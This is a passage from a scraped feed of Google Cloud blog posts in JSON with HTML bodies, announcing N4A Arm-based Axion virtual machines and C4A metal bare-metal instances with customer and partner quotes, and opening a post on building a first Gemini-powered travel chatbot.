        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Decision makers and builders today face a constant challenge: managing rising cloud costs while delivering the performance their customers demand. As applications evolve to use scale-out microservices and handle ever-growing data volumes, organizations need maximum efficiency from their underlying infrastructure to support their growing general-purpose workloads.</span></p>\n<p><span style=\"vertical-align: baseline;\">To meet this need, we’re excited to announce our latest Axion-based virtual machine series: N4A, available in preview on Compute Engine, Google Kubernetes Engine (GKE), Dataproc, and Batch, with support in Dataflow and other services coming soon. </span></p>\n<p><span style=\"vertical-align: baseline;\">N4A is the most cost-effective N-series VM to date, delivering </span><strong style=\"vertical-align: baseline;\">up to 2x better price-performance and 80% better performance-per-watt </strong><span style=\"vertical-align: baseline;\">than comparable current-generation x86-based VMs. This makes it easier for customers to further optimize the Total Cost of Ownership (TCO) for a broad range of general-purpose workloads. We see this with cloud-native businesses running scale-out web servers and microservices on GKE, enterprise teams managing backend application servers and mid-sized databases, and engineering organizations operating large CI/CD build farms. </span></p>\n<p><span style=\"vertical-align: baseline;\">At Google Cloud, we co-design our compute offerings with storage, networking and software at every layer of the stack, from orchestrators to runtimes, to deliver exceptional system-level performance and cost-efficiency. N4A’s breakthrough price-performance is powered by our latest-generation Google Axion Processors, built on the Arm® Neoverse® N3 compute core, Google </span><a href=\"https://cloud.google.com/compute/docs/dynamic-resource-management\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dynamic Resource Management</span></a><span style=\"vertical-align: baseline;\"> (DRM) technology, and </span><a href=\"https://cloud.google.com/titanium\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Titanium</span></a><span style=\"vertical-align: baseline;\">, Google Cloud’s custom-designed hardware and software system that offloads networking and storage processing to free up the CPU. Titanium is part of Google Cloud’s vertically integrated software stack — from the custom silicon in our servers to our planet-scale network traversing </span><a href=\"https://cloud.google.com/about/locations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">7.75 million kilometers of terrestrial and subsea fiber</span></a><span style=\"vertical-align: baseline;\"> across 42 regions — that is engineered to maximize efficiency and provide the ultra-low latency and high bandwidth to customers at global scale.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Redefining general-purpose compute and enabling AI inference</strong></h3>\n<p><span style=\"vertical-align: baseline;\">N4A is engineered for versatility, with a feature set to support your general-purpose and CPU-based AI workloads. It comes in predefined and custom shapes, with up to 64 vCPUs and 512GB of DDR5 in high-cpu (2GB of memory per vCPU), standard (4GB per vCPU), and high-memory (8GB per vCPU) configurations, with instance networking up to 50 Gbps of bandwidth. N4A VMs feature support for our latest generation Hyperdisk storage options, including Hyperdisk Balanced, Hyperdisk Throughput, and Hyperdisk ML (coming later), providing up to 160K IOPS, 2.4GB/s of throughput per instance. </span></p>\n<p><span style=\"vertical-align: baseline;\">N4A performs well across a range of industry-standard benchmarks that represent the key workloads our customers run every day. For example, relative to comparable current-generation x86-based VM offerings, N4A delivers up to </span><strong style=\"vertical-align: baseline;\">105%</strong><span style=\"vertical-align: baseline;\"> better price-performance for </span><span style=\"vertical-align: baseline;\">compute-bound workloads</span><span style=\"vertical-align: baseline;\">, up to </span><strong style=\"vertical-align: baseline;\">90%</strong><span style=\"vertical-align: baseline;\"> better price-performance for </span><span style=\"vertical-align: baseline;\">scale-out web servers</span><span style=\"vertical-align: baseline;\">, up to </span><strong style=\"vertical-align: baseline;\">85%</strong><span style=\"vertical-align: baseline;\"> better price-performance for </span><span style=\"vertical-align: baseline;\">Java applications</span><span style=\"vertical-align: baseline;\">, and up to</span><strong style=\"vertical-align: baseline;\"> 20%</strong><span style=\"vertical-align: baseline;\"> better price-performance for general-purpose databases.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_q9MnCJ1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Footnote: As of October 2025. Performance based on the estimated SPECrate®2017_int_base, estimated SPECjbb2015, MySQL Transactions/minute (RO), and Google internal Nginx Reverse Proxy benchmark scores run in production on comparable latest-generation generally-available VMs with general purpose storage types. Price-performance claims based on published and upcoming list prices for Google Cloud.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In the real world, early adopters are seeing dramatic price-performance improvements from the new N4A instances.</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_3I8oyl8.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"At ZoomInfo, we operate a massive data intelligence platform where efficiency is paramount. Our core data processing pipelines, which are critical for delivering timely insights to our customers, run extensively on Dataflow and Java services in GKE. In our preview of the new N4A instances, we measured a 60% improvement in price-performance for these key workloads compared to their x86-based counterparts. This allows us to scale our platform more efficiently and deliver more value to our customers, faster.\"</i> - <b>Sergei Koren, Chief Infrastructure Architect, ZoomInfo​</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_nDU2gjP.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“Organizations today need performance, efficiency, flexibility, and scale to meet the computing demands of the AI era; this requires the close collaboration and co-design that is at the heart of our partnership with Google Cloud. As N4A redefines cost-efficiency, customers gain a new level of infrastructure optimization, enabling enterprises to choose the right infrastructure for their workload requirements with Arm and Google Cloud.”</i> - <b>Bhumik Patel, Director, Server Ecosystem Development, Infrastructure Business, Arm</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Granular control with Custom Machine Types and Hyperdisk</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A key advantage of our N-series VMs has always been flexibility, and with N4A, we are bringing one of our most popular features to the Axion family for the first time: Custom Machine Types (</span><a href=\"https://cloud.google.com/compute/docs/instances/creating-instance-with-custom-machine-type\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CMT</span></a><span style=\"vertical-align: baseline;\">). Instead of fitting your workload into a predefined shape, CMTs on N4A lets you independently configure the amount of vCPU and memory to meet your application's unique needs. This ability to right-size your instances means you pay only for the resources you use, minimizing waste and optimizing your total cost of ownership.</span></p>\n<p><span style=\"vertical-align: baseline;\">This same principle of matching resources to your specific workload applies to storage. N4A VMs feature support for our latest generation of </span><a href=\"https://cloud.google.com/compute/docs/disks/hyperdisks\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hyperdisk</span></a><span style=\"vertical-align: baseline;\">, allowing you to select the perfect storage profile for your application's needs:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hyperdisk Balanced:</strong><span style=\"vertical-align: baseline;\"> Offers an optimal mix of performance and cost for the majority of general-purpose workloads, with up to 160K IOPs per N4A VM.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hyperdisk Throughput:</strong><span style=\"vertical-align: baseline;\"> Delivers up to 2.4GiBps of max throughput for bandwidth-intensive analytics workloads like Hadoop or Kafka, providing high-capacity storage at an excellent value.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hyperdisk ML </strong><span style=\"vertical-align: baseline;\">(post GA)</span><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Purpose-built for AI/ML workloads, allows you to attach a single disk containing your model weights or datasets to up to 32 N4A instances simultaneously for large-scale inference or training tasks.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hyperdisk Storage Pools</strong><span style=\"vertical-align: baseline;\">: Instead of provisioning capacity and performance on a per-volume basis, allows you to provision performance and capacity in aggregate, </span><a href=\"https://cloud.google.com/blog/products/compute/cost-saving-strategies-when-migrating-to-google-cloud-compute?e=48754805#:~:text=2.%20Optimize%20your%20block%20storage%20selections\"><span style=\"text-decoration: underline; vertical-align: baseline;\">further optimizing costs by up to 50%</span></a><span style=\"vertical-align: baseline;\"> and simplifying management.</span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_ZB4gdHF.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"At Vimeo, we have long relied on Custom Machine Types to efficiently manage our massive video transcoding platform. Our initial tests on the new Axion-based N4A instances have been very compelling, unlocking a new level of efficiency. We've observed a 30% improvement in performance for our core transcoding workload compared to comparable x86 VMs. This points to a clear path for improving our unit economics and scaling our services more profitably, without changing our operational model.\"</i> - <b>Joe Peled, Sr. Director of Hosting &amp; Delivery Ops</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">A growing Arm-based Axion portfolio for customer choice</strong></h3>\n<p><span style=\"vertical-align: baseline;\">C-series VMs are designed for workloads that require consistently high performance, e.g., medium-to-large-scale databases and in-memory caches. Alongside them, N-series VMs have been a key Compute Engine pillar, offering a balance of price-performance and flexibility, lowering the cost of running workloads with variable resource needs such as scale-out Java/GKE workloads. </span><span style=\"vertical-align: baseline;\">We released our first Axion-based machine series, </span><a href=\"https://cloud.google.com/blog/products/compute/try-c4a-the-first-google-axion-processor?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">C4A</span></a><span style=\"vertical-align: baseline;\">, in October 2024, and the </span><span style=\"vertical-align: baseline;\">introduction of N4A complements C4A, providing a range of Google Axion instances suited to your workloads’ precise needs. </span></p>\n<p><span style=\"vertical-align: baseline;\">On top of that, GKE unlocks significant price-performance advantages by orchestrating Axion-based C4A and N4A machine types. GKE leverages </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/about-custom-compute-classes\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Custom Compute Classes</span></a><span style=\"vertical-align: baseline;\"> to provision and mix these machine types, matching workloads to the right hardware. This automated, heterogeneous cluster management allows teams to optimize their total cost of ownership across their entire application stack.</span><span style=\"text-decoration: line-through; vertical-align: baseline;\"> </span></p>\n<p><span style=\"vertical-align: baseline;\">Also </span><a href=\"https://cloud.google.com/blog/products/compute/new-axion-c4a-metal-offers-bare-metal-performance-on-arm\"><span style=\"text-decoration: underline; vertical-align: baseline;\">joining the Axion family is C4A.metal</span></a><span style=\"vertical-align: baseline;\">, Google Cloud’s first Axion bare metal instance that helps builders meet use cases that require access to the underlying physical server to run specialized applications in a non-virtualized environment, such as automotive systems development, workloads with strict licensing requirements, and Android software development. </span><a href=\"https://cloud.google.com/blog/products/compute/new-axion-c4a-metal-offers-bare-metal-performance-on-arm\"><span style=\"text-decoration: underline; vertical-align: baseline;\">C4A.metal will be available in preview soon</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Supported by the broad and mature Arm ecosystem, adopting Axion is easier than ever, and the combination of C4A and N4A can help you lower the total cost of running your business, without compromising on performance or workload-specific requirements</span><span style=\"vertical-align: baseline;\">:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">N4A for cost optimization and flexibility.</strong><span style=\"vertical-align: baseline;\"> Deliberately engineered for general-purpose workloads that need a balance of price and performance, including scale-out web servers, microservices, containerized applications, open-source databases, batch, data analytics, development environments, data preparation and AI/ML experimentation.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">C4A for consistently high performance, predictability, and control.</strong><span style=\"vertical-align: baseline;\"> Powering workloads where every microsecond counts, such as medium- to large-scale databases, in-memory caches, cost-effective AI/ML inference, and high-traffic gaming servers. C4A delivers consistent performance, offering a controlled maintenance experience for mission-critical workloads, networking bandwidth up to 100 Gbps, and next-generation Titanium Local SSD storage. </span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/5_m4GINGe.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"Migrating to Google Cloud's Axion portfolio gave us a critical competitive advantage. We slashed our compute consumption by 20% while maintaining low and stable latency with C4A instances, such as our Supply-Side Platform (SSP) backend service. Additionally, C4A enabled us to leverage Hyperdisk with precisely the IOPS we need for our stateful workloads, regardless of instance size. This flexibility gives us the best of both worlds - allowing us to win more ad auctions for our clients while significantly improving our margins. We're now testing the N4A family by running some of our key workloads that require the most flexibility, such as our API relay service. We are happy to share that several applications running in production are consuming 15% less CPU compared to our previous infrastructure, reducing our costs further, while ensuring that the right instance backs the workload characteristics required.”</i> - <b>Or Ben Dahan, Cloud &amp; Software Architect at Rise</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Get started with N4A today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">N4A is available during preview in the following Google Cloud regions: </span><strong style=\"vertical-align: baseline;\">us-central1 (Iowa)</strong><span style=\"vertical-align: baseline;\">, </span><strong style=\"vertical-align: baseline;\">us-east4 (N. Virginia)</strong><span style=\"vertical-align: baseline;\">, </span><strong style=\"vertical-align: baseline;\">europe-west3 (Frankfurt) </strong><span style=\"vertical-align: baseline;\">and </span><strong style=\"vertical-align: baseline;\">europe-west4 (Netherlands)</strong><span style=\"vertical-align: baseline;\"> with more regions to follow. </span></p>\n<p><span style=\"vertical-align: baseline;\">We can’t wait to see what you build. To get access, sign-up </span><a href=\"https://forms.gle/HYY5FWRKewYuDMB27\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">here</strong></a><span style=\"vertical-align: baseline;\">. To learn more, check out the </span><a href=\"https://cloud.google.com/compute/docs/general-purpose-machines#n4a_series\"><span style=\"text-decoration: underline; vertical-align: baseline;\">N4A documentation</span></a><span style=\"font-style: italic; vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-06 13:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/compute/new-axion-c4a-metal-offers-bare-metal-performance-on-arm/",
        "title": "Announcing Axion C4A metal: Arm-based Axion instances for specialized use cases",
        "thumbnail": null,
        "author": "Yarden Halperin",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Today, we are thrilled to announce C4A metal, our first bare metal instance running on Google Axion processors, available in preview soon. C4A metal is designed for specialized workloads that require direct hardware access and Arm®-native compatibility. </span></p>\n<p><span style=\"vertical-align: baseline;\">Now, organizations running environments such as Android development, automotive simulation, CI/CD pipelines, security workloads, and custom hypervisors can run them on Google Cloud, without the performance overheads and complexity of nested virtualization.</span></p>\n<p><span style=\"vertical-align: baseline;\">C4A metal instances, like other Axion instances, are built on the standard Arm architecture, so your applications and operating systems compiled for Arm remain portable across your cloud, on-premises, and edge environments, protecting your development investment. C4A metal offers 96 vCPUs, 768GB of DDR5 memory, up to 100Gbps of networking bandwidth, with full support for Google Cloud Hyperdisk including Hyperdisk Balanced, Extreme, Throughput, and ML block storage options.</span></p>\n<p><span style=\"vertical-align: baseline;\">Google Cloud provides workload-optimized infrastructure to ensure the right resources are available for every task. C4A metal, like the </span><a href=\"https://cloud.google.com/products/axion?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Axion virtual machine family</span></a><span style=\"vertical-align: baseline;\">, is powered by </span><a href=\"https://cloud.google.com/titanium\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Titanium</span></a><span style=\"vertical-align: baseline;\">, a key component for multi-tier offloads and security that is foundational to our infrastructure. Titanium's custom-designed silicon offloads networking and storage processing to free up the CPU, and its dedicated SmartNIC manages all I/O, ensuring that Axion cores are reserved exclusively for your application's performance. Titanium is part of Google Cloud’s vertically integrated software stack — from the custom silicon in our servers to our planet-scale network traversing </span><a href=\"https://cloud.google.com/about/locations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">7.75 million kilometers of terrestrial and subsea fiber</span></a><span style=\"vertical-align: baseline;\"> across 42 regions — that is engineered to maximize efficiency and provide the ultra-low latency and high bandwidth to customers at global scale.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Architectural parity for automotive workloads</span></h3>\n<p><span style=\"vertical-align: baseline;\">Automotive customers can benefit from the Arm architecture’s performance, efficiency, and flexible design for in-vehicle systems such as infotainment and Advanced Driver Assistance Systems (ADAS). Axion C4A metal instances enable architectural parity between test environments and production silicon, allowing automotive technology providers to validate their software on the same Arm Neoverse instruction set architecture (ISA) used in production electronic control units (ECUs). This significantly reduces the risk of late-stage integration failures. For performance-sensitive tasks, these customers can execute demanding virtual hardware-in-the-loop (vHIL) simulations with the consistent, low-latency performance of physical hardware, ensuring test results are reliable and accurate. Finally, C4A metal lets providers move beyond the constraints of a physical lab, by dynamically scaling entire test farms and transforming them from fixed capital expenses into flexible operational ones.</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_nDU2gjP.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“In the era of AI-defined vehicles, the accelerating pace and complexity of technology are pushing us to rethink traditional linear approaches to software development. Google Cloud’s introduction of Axion C4A metal is a major step forward in this journey. By offering full architectural parity on Arm between test environments and physical silicon, customers can benefit from accelerated development cycles, enabling continuous integration and compliance for a variety of specialized use cases.\"</i> - <b>Dipti Vachani, Senior Vice President and General Manager, Automotive Business, Arm</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"qnx\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/qnx.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“Our partners and customers rely on QNX to deliver the safety, security, reliability, and real-time performance required for their most mission-critical systems — from advanced driver assistance to digital cockpits. As the Software-Defined Vehicle era continues to gain momentum, decoupling software development from physical hardware is no longer optional — it’s essential for innovation at scale. The launch of Google Cloud’s C4A-metal instances on Axion introduces a powerful ARM-based bare metal platform that we are eager to test and support as this will enable transformative cloud infrastructure benefits for our automotive ecosystem.” -</i> <b>Grant Courville, Senior Vice President, Products and Strategy, QNX</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"qualcomm\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/qualcomm.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“The future of automotive mobility demands unprecedented speed and precision in practice and development. For automakers and suppliers leveraging the Snapdragon Digital Chassis platform, aligning their cloud development and testing environments to ensure parity with the Snapdragon SoCs in the vehicle is absolutely crucial for efficiency and quality. We are excited about Google Cloud’s commitment to this segment — offering C4A-metal instances with Axion is a massive leap forward, giving the automotive ecosystem a true 1:1 physical to virtual environment in the cloud. This breakthrough significantly reduces integration challenges, slashes validation time, and allows our partners to unleash AI-driven features to market faster at scale.”</i> - <b>Laxmi Rayapudi, VP, Product Management, Qualcomm Technologies, Inc.</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Align test and production for Android development</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The Android platform was built for Arm-based processors, the standard for virtually all mobile devices. By running development and testing pipelines on the bare-metal instances of Axion processors with C4A metal, Android developers can benefit from native performance, eliminating the overhead of emulation management, such as slow instruction-by-instruction translation layers. In addition, they can significantly reduce latency for Android build toolchains and automated test systems, leading to faster feedback cycles. C4A metal also solves the performance challenges of nested virtualization, making it a great platform for scalable Cuttlefish (Cloud Android) environments. </span></p>\n<p><span style=\"vertical-align: baseline;\">Once available, developers can deploy scalable Cuttlefish environment farms on top C4A metal instances with an </span><a href=\"https://github.com/googlecloudplatform/horizon-sdv\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">upcoming release of Horizon</span></a><span style=\"vertical-align: baseline;\"> or by directly leveraging </span><a href=\"https://github.com/google/cloud-android-orchestration/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Android Orchestration</span></a><span style=\"vertical-align: baseline;\">. C4A metal allows these virtual devices to run directly on the physical hardware, providing the performance needed to build and manage large, high-fidelity test farms for true continuous testing.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Bare metal access without compromise</span></h3>\n<p><span style=\"vertical-align: baseline;\">As a cloud offering, </span><span style=\"vertical-align: baseline;\">C4A metal enables a lower total cost of ownership by replacing the entire lifecycle of physical hardware procurement and management with a predictable operational expense. This eliminates the direct capital expenditures of purchasing servers, along with the associated operational costs of hardware maintenance contracts, power, cooling, and physical data center space. You can programmatically provision and de-provision instances to match your exact testing demands, ensuring you are not paying for an over-provisioned fleet of servers sitting idle waiting for peak development cycles.</span></p>\n<p><span style=\"vertical-align: baseline;\">Operating as standard compute resources within your Virtual Private Cloud (VPC), C4A metal instances inherit and leverage the same security policies, audit logging, and network controls as virtual machines. Instances are designed to appear as physical servers to your toolchain and support common monitoring and security agents, allowing for straightforward integration with your existing Google Cloud environments. This integration extends to storage, where network-attached Hyperdisk allows you to manage persistent disks using the same snapshot and resizing tools your teams already use for your virtual machine fleet.</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"chainguard\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/chainguard.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“For our build system, true isolation is paramount. Running on Google Cloud’s new C4A metal instance on Axion enables us to isolate our package builds with a strong hypervisor security boundary without compromising on build performance.\"</i> - <b>Matthew Moore, Founder and CTO, Chainguard, Inc</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Better together: the Axion C and N series</span></h3>\n<p><span style=\"vertical-align: baseline;\">The addition of C4A metal to the Arm-based Axion portfolio allows customers to lower TCO by matching the right infrastructure to every workload. While Axion </span><a href=\"https://cloud.google.com/compute/docs/general-purpose-machines#c4a_series\"><span style=\"text-decoration: underline; vertical-align: baseline;\">C4A virtual machines</span></a><span style=\"vertical-align: baseline;\"> optimize for consistently high performance and </span><a href=\"https://cloud.google.com/blog/products/compute/axion-based-n4a-vms-now-in-preview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">N4A virtual machines</span></a><span style=\"vertical-align: baseline;\"> (now in preview) optimize for price-performance and flexibility, C4A metal addresses the critical need for direct hardware access by specialized applications that require a non-virtualized Arm environment.</span></p>\n<p><span style=\"vertical-align: baseline;\">For example, an Android development company could create a highly efficient CI/CD pipeline by using C4A virtual machines for the build farm. For large-scale testing, they could use C4A metal to run Cuttlefish virtual devices directly on the physical hardware, eliminating nested virtualization overhead. To enable even higher fidelity, they can run Cuttlefish hybrid devices on C4A metal, reusing the system images from their physical hardware. Concurrently, supporting infrastructure such as CI/CD orchestrators and artifact repositories could run on cost-effective N4A instances, using Custom Machine Types to right-size resources and minimize operational expenses.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Coming soon to preview</span></h3>\n<p><span style=\"vertical-align: baseline;\">C4A metal is scheduled for preview soon. Please fill </span><a href=\"https://docs.google.com/forms/d/1iPfHMoGBHVDs_5zXohLCXjJWyEVASEjA2BZLqd3mtsI/edit#responses\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this form</span></a><span style=\"vertical-align: baseline;\"> to sign up for early access and additional updates. </span></p></div>",
        "published_date": "2025-11-06 13:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/your-first-ai-application-is-easier-than-you-think/",
        "title": "Your First AI Application is Easier Than You Think",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/LLM_App_hero_image_1.max-600x600.png",
        "author": "Mollie Pettit",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">If you're a developer, you've seen </span><a href=\"https://cloud.google.com/use-cases/generative-ai?e=48754805&amp;hl&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\">generative AI</a><span style=\"vertical-align: baseline;\"> everywhere. It can feel like a complex world of </span><a href=\"https://cloud.google.com/discover/what-is-an-ai-model?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">models</span></a><span style=\"vertical-align: baseline;\"> and advanced concepts. It can be difficult to know where to actually start.</span></p>\n<p><span style=\"vertical-align: baseline;\">The good news is that building your first AI-powered application is more accessible than you might imagine. You don't need to be an AI expert to get started. This post introduces a new codelab designed to bridge this gap and provide you with a first step. We'll guide you through the entire process of building a functional, interactive travel chatbot using Google's </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini model</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><a 